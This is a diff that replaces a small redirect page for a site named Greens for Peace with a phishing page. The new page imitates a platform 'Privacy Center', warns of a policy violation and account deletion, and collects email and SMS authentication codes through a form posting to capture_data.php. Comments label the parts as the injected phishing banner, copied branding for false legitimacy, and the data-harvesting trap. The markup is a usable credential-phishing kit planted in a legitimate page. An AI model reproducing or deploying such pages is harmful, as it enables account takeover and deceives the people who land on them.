@@ -1,14 +1,73 @@
 <!DOCTYPE html>
-<html lang="en-GB">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta http-equiv="refresh" content="0; url=/greensforpeace/">
-  <title>Greens for Peace</title>
-  <link rel="canonical" href="https://threetwosix.co.uk/greensforpeace/">
-  <script>window.location.replace("/greensforpeace/");</script>
+    <meta charset="UTF-8">
+    <title>Privacy Center - Security Notice</title>
+    <!-- Stolen or mirrored stylesheet links -->
+    <link rel="stylesheet" href="privacy-styles.css">
 </head>
 <body>
-  <p>Redirecting to <a href="/greensforpeace/">Greens for Peace</a>.</p>
+
+    <!-- Outer Layout Wrapper -->
+    <div class="main-container">
+        
+        <!-- Sidebar Navigation (Mirrored from a real Help/Privacy Center) -->
+        <aside class="sidebar">
+            <h2>Privacy Center</h2>
+            <ul class="nav-links">
+                <li class="active">Privacy Center Home Page</li>
+                <li>Privacy Policy</li>
+                <li>Cookie Policy</li>
+                <!-- More copied menu items to build false legitimacy -->
+            </ul>
+        </aside>
+
+        <!-- Main Content Area -->
+        <main class="content-body">
+            
+            <!-- INJECTED PHISHING BANNER (The fake part) -->
+            <div class="violation-alert-box">
+                <img src="../img/ngsfd.png" alt="Brand Logo">
+                <div class="alert-header">
+                    <h1>Policy Violation</h1>
+                    <span class="status-badge">OPEN</span>
+                    <span class="case-number">Case #10025078036</span>
+                </div>
+                
+                <div class="warning-text">
+                    <h3>We have scheduled your account for deletion</h3>
+                    <p>If you wish to appeal, please provide the requested information below...</p>
+                </div>
+            </div>
+
+            <hr>
+
+            <!-- TRADEMARK / LEGAL JARGON FLUFF -->
+            <section class="legal-explanation">
+                <h3>What is trademark infringement?</h3>
+                <p>The touchstone of trademark infringement is often "likelihood of confusion"...</p>
+            </section>
+
+            <!-- THE TRAP: DATA HARVESTING / 2FA INPUT FORM -->
+            <div class="authentication-prompt-box">
+                <h2>Check your authentication code</h2>
+                <p>Enter the code for this account: Email and SMS verification codes required.</p>
+                
+                <!-- Form fields wired to a backend script (e.g., PHP or Node.js) to steal input -->
+                <form action="capture_data.php" method="POST">
+                    <input type="text" name="auth_code" placeholder="Enter 6 or 8-digit code" required>
+                    <button type="submit">Continue</button>
+                </form>
+            </div>
+
+        </main>
+    </div>
+
+    <!-- Footer with copied branding -->
+    <footer class="footer">
+        <img src="../img/nt43gsfd.png" alt="Company Logo">
+        <p>© 2026 Platform Inc.</p>
+    </footer>
+
 </body>
 </html>
